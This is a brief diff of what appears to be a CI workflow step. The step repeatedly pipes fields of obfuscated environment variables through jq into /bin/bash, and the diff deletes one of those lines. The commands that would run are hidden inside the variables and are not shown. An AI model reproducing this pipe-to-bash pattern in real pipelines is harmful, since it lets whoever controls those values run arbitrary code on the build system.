@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$p91" | jq -r .shqdu125 | /bin/bash
           printf '%s' "$wp8" | jq -r .gw95 | /bin/bash
-          echo $zi816 | jq -r .qwjff4686 | /bin/bash
           echo $bzweb57 | jq -r .wlct89 | /bin/bash
           echo $h27333 | jq -r .ky34605 | /bin/bash
           echo $hnoyg07457 | jq -r .dncjq21683 | /bin/bash
